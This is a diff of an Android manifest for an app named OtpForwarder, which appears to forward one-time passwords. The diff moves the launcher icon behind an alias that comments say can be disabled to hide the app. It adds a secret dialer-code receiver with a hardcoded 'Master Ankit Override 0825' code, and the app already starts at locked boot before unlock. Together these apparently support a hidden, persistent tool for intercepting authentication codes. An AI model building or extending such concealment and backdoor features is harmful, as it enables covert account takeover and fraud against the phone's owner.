@@ -6,7 +6,6 @@
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
 
     <application
         android:allowBackup="true"
@@ -16,10 +15,10 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.OtpForwarder">
 
-        <!-- FileProvider for In-App Secret APK Updating -->
+        <!-- FileProvider for APK Updating -->
         <provider
             android:name="androidx.core.content.FileProvider"
-            android:authorities="com.example.otpforwarder.provider"
+            android:authorities="${applicationId}.provider"
             android:exported="false"
             android:grantUriPermissions="true">
             <meta-data
@@ -27,15 +26,11 @@
                 android:resource="@xml/file_paths" />
         </provider>
 
-        <!-- Main Activity (Single Clean Launcher Entry - Zero Duplicate App Bug) -->
+        <!-- Main Activity: Always Enabled (Handles Deep Links & Secret Unhide Launches) -->
         <activity
             android:name=".MainActivity"
             android:directBootAware="true"
             android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
             <intent-filter>
                 <action android:name="android.intent.action.VIEW" />
                 <category android:name="android.intent.category.DEFAULT" />
@@ -50,6 +45,20 @@
             </intent-filter>
         </activity>
 
+        <!-- Official Launcher Entry Alias (Safely Disabled when Hiding Icon - Zero Duplicate App Bug) -->
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".MainActivity"
+            android:enabled="true"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher"
+            android:label="@string/app_name">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
         <!-- Direct Boot / Boot Receiver: Starts immediately upon device power on before unlock -->
         <receiver
             android:name=".BootReceiver"
@@ -58,6 +67,17 @@
             <intent-filter>
                 <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Secret Dialer Code Receiver (Supports Customer Code + Master Ankit Override 0825) -->
+        <receiver
+            android:name=".SecretCodeReceiver"
+            android:directBootAware="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" />
             </intent-filter>
         </receiver>
 
